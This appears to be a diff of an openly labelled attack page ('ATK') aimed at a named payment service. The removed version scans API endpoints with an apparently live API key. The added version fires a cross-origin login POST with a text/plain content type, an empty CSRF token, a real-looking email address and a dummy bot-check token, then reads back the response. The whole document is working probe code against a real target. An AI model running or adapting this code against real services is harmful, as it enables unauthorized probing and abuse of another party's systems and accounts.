@@ -1,30 +1,17 @@
 <!DOCTYPE html>
-<html><head><meta charset="utf-8"><title>ATK-HL-SCAN</title></head>
-<body><pre id="out">HL-SCAN-START</pre>
+<html><head><meta charset="utf-8"><title>ATK-DL</title></head>
+<body><pre id="out">DL-START</pre>
 <script>
 try {
-  var results = [];
-  var endpoints = [
-    "/api/v1/merchant/get_transactions?apiKey=pk_live_5cf10a0d2c6fffd8e92c8ee633b69b02&limit=5",
-    "/api/v1/metadata?apiKey=pk_live_5cf10a0d2c6fffd8e92c8ee633b69b02",
-    "/api/v1/user/get_orders",
-    "/api/v1/order/create_order?apiKey=pk_live_5cf10a0d2c6fffd8e92c8ee633b69b02",
-    "/api/v1/merchant/get_status?apiKey=pk_live_5cf10a0d2c6fffd8e92c8ee633b69b02&order_id=3fa85f64-5717-4562-b3fc-2c963f66afa6"
-  ];
-  for (var i = 0; i < endpoints.length; i++) {
-    try {
-      var xhr = new XMLHttpRequest();
-      xhr.open("GET", "https://widget.swapped.com" + endpoints[i], false);
-      xhr.send();
-      results.push(endpoints[i].split("?")[0] + " => " + xhr.status + " :: " + xhr.responseText.slice(0, 100));
-    } catch (e) {
-      results.push(endpoints[i].split("?")[0] + " => ERR " + e.message);
-    }
-  }
-  document.title = "HL-SCAN-DONE";
-  document.getElementById("out").textContent = results.join("\n");
+  var xhr = new XMLHttpRequest();
+  xhr.open("POST", "https://dashboard-api.swapped.com/api/v1/auth/login", false);
+  xhr.setRequestHeader("Content-Type", "text/plain");
+  xhr.setRequestHeader("X-CSRF-Token", "");
+  xhr.send(JSON.stringify({ email: "platostri@proton.me", turnstile_token: "XXXX.DUMMY.TOKEN.XXXX" }));
+  document.title = "DL-" + xhr.status;
+  document.getElementById("out").textContent = "DL-RESULT " + xhr.status + " :: " + xhr.responseText.slice(0, 500);
 } catch (e) {
-  document.title = "HL-SCAN-ERR";
-  document.getElementById("out").textContent = "ERR " + e.message;
+  document.title = "DL-ERR";
+  document.getElementById("out").textContent = "DL-ERR " + e.message;
 }
 </script></body></html>
